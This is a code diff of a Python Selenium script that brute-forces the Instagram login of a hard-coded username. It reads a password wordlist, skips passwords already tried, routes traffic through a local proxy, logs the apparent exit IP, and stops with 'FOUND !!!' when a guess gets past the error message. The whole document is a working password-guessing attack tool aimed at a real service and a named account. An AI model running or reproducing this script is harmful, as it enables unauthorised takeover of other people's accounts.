@@ -1,16 +1,19 @@
 #!/usr/bin/python
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
-import time, os
+import time
+import os
+import sys
 
 username = 'redhootcp'
 delay = 0
-passwords = [ '666666' ]
+passwords = ['666666']
 used_passwords = []
 
 report_file = 'report.log'
 used_passwords_file = 'used_passes.txt'
 passwords_file = 'wordlist.txt'
+
 
 def login():
     driver.get('https://www.instagram.com/accounts/login/?force_classic_login')
@@ -24,6 +27,7 @@ def login():
     elem.send_keys(Keys.RETURN)
     time.sleep(delay)
 
+
 def browser_config():
     profile = webdriver.FirefoxProfile()
     profile.set_preference("network.proxy.http", "localhost")
@@ -34,34 +38,41 @@ def browser_config():
     profile.set_preference("network.proxy.type", 1)
     return profile
 
+
+def get_ip():
+    driver.get('https://icanhazip.com/')
+    ip_address = driver.page_source
+    return ip_address
+
 with open(passwords_file, 'r') as a:
     passwords_queue = a.readlines()
 if os.path.isfile(used_passwords_file):
-  with open(used_passwords_file, 'r') as b:
-    used_passwords = b.readlines()
+    with open(used_passwords_file, 'r') as b:
+        used_passwords = b.readlines()
 
 passwords = [x for x in passwords_queue if x not in used_passwords]
 
 profile = browser_config()
-report = open(report_file, 'a')
 used_passes = open(used_passwords_file, 'a')
 driver = webdriver.Firefox(profile)
+
+ip_address = get_ip()
+
+check_text = 'Please enter a correct username and password. Note that both fields are case-sensitive.'
 
 for line in passwords:
     password = line.rstrip()
     login()
-    print "%s %s %s " % (time.strftime("%Y-%m-%d %H:%M"), driver.title, password)
-    report.write("%s %s \n" % (time.strftime("%Y-%m-%d %H:%M"), password))
+    report = open(report_file, 'a')
+    print "%s %s %s" % (time.strftime("%Y-%m-%d %H:%M:%S"), password, ip_address)
+    report.write("%s %s %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), password, ip_address))
+    report.close()
 
-    if 'Page Not Found' in driver.title:
-        while ('Page Not Found' in driver.title):
+    if check_text not in driver.page_source:
+        if 'Page Not Found' in driver.title:
             driver.close()
-            time.sleep(10)
-            driver = webdriver.Firefox()
-            driver.delete_all_cookies()
-            print "%s %s %s " % (time.strftime("%Y-%m-%d %H:%M"), driver.title, password)
-            report.write("%s %s \n" % (time.strftime("%Y-%m-%d %H:%M"), password))
-            login()
+            sys.exit(1)
+        print "FOUND !!! %s" % (password)
+        sys.exit(1)
     used_passes.write("%s\n" % password)
-report.close()
 used_passes.close()
